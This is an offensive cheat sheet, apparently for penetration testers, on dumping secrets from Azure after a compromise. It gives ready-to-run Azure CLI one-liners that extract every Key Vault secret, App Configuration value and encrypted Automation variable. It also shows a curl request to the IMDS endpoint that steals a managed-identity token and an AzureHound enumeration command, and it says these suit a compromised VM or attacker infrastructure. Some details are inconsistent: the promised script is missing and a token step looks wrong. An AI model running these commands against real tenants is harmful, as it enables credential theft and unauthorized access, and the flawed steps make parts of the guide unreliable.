# Secrets Retrieval Techniques

## Vectors to fetch the secrets

1. Extract secrets from Key vaults
2. Extract secrets from App configurations Key-Value pairs
3. Extract secrets from Automation accounts variables
4. Exploit Azure Instance Metadata Service (IMDS)

## Extract secrets from Key vaults

- Step-1: Lists every Key Vault accessible in the current subscription and outputs just the vault names, one per line. **az keyvault list --query "[].name" -o tsv**
- Step-2: For a given vault, lists every secret it contains and outputs their full resource IDs (needed to retrieve values). **az keyvault secret list --vault-name "{vault}" --query "[].id" -o tsv**
- Step-3: Fetches the current value of a single secret by its resource ID. Requires get permission on the vault's secrets. **az keyvault secret show --id "{id}" --query "value" -o tsv**

```bash
az keyvault list --query "[].name" -o tsv | xargs -I {vault} sh -c 'az keyvault secret list --vault-name "{vault}" --query "[].id" -o tsv | xargs -I {id} az keyvault secret show --id "{id}" --query "value" -o tsv'
```

## Extract secrets from App configs Key-Value pairs

- Step-1: az appconfig list: Lists all App Configuration instances.
- Step-2: az appconfig kv list: Retrieves key-value pairs from each configuration store.

```bash
az appconfig list --query "\[\].name" -o tsv | xargs -I {} az appconfig kv list --name {} --query "\[\].{Key:key, Value:value}" -o tsv
```

## Extract secrets from Automation accounts variables

- Targets encrypted variables that may contain credentials or secrets.

az automation variable list --automation-account-name \<account\> --resource-group \<rg\> -o json \| \\ jq -r '.\[\] \| select(.encrypted == true) \| .name' \| \\  xargs -I {} az automation variable show --name {} --automation-account-name \<account\> --resource-group \<rg\> --query
"value" -o tsv

## Exploit Azure Instance Metadata Service (IMDS)

- **Step 1: Query for Managed Identity**
  - Retrieves an access token for the VM's assigned managed identity.
  - Use the token to authenticate with Azure CLI or REST APIs.

    ```bash
    curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2018-02-01"
    ```

- **Step 2: Use Access Token to Enumerate Secrets**

    ```bash
    export AZURE_TOKEN=\<access_token\>
    az account get-access-token --access-token \$AZURE_TOKEN
    az keyvault secret list --vault-name \<vault\> --query "\[\].id" -o tsv \| \\
    xargs -I {} az keyvault secret show --id {} --query "value" -o tsv
    ```

## Use AzureHound/BloodHound for Role Enumeration

AzureHound can be used to enumerate principals, roles, Key Vault access policies, and privilege escalation paths:

./AzureHound.exe -c All --token \<token\> --tenant \<tenant_id\>

You can extract relevant object IDs and automate retrieval of Key Vault secrets using the Azure CLI or SDKs.

## Optional Tools and Helpers 🛠

- **CloudFuzzer Equivalent**: No direct Azure equivalent for tools like cf s3ls or s3bucketbrute. However, Azure storage account name bruteforcing can be scripted via DNS or az storage account check-name.
- **IMDS-Helper Equivalent**: IMDS access can be scripted with curl and custom tokens. Some tools like AZScanner, CloudSploit, and ScoutSuite can wrap around these.

## Summary: Key Azure Services to Target for Secrets

| **Azure Service** | **Tool/Command** | **Notes** |
| --- | --- | --- |
| Key Vault | az keyvault secret show | Primary location for secrets |
| App Configuration | az appconfig kv list | Often used for app secrets |
| Automation Variables | az automation variable show | May store service credentials |
| Instance Metadata Service | curl to 169.254.169.254 | Fetch managed identity tokens |
| AzureHound + BloodHound | AzureHound.exe -c All | AD and RBAC enumeration |

## Azure secrets enumeration script

This script is used during a **post-exploitation or assessment phase** after gaining valid credentials or a token (e.g., via VM Managed Identity exploitation or Azure CLI access):

>azure_secrets_enum.sh

### Notes

- Works on Linux/macOS or WSL.
- Can be run on a compromised VM or from attacker infrastructure (if credentials/token is set).
- You can optionally wrap this into a PowerShell script for Windows VMs.

#### Features 🧰

- Automatically retrieves a token from **IMDS** (ideal for compromised Azure VMs).
- Dumps:
  - Key Vault secrets
  - App Configuration key-values
  - Encrypted Automation Account variables
- Works on **PowerShell 5.x** or **7+** with Azure CLI
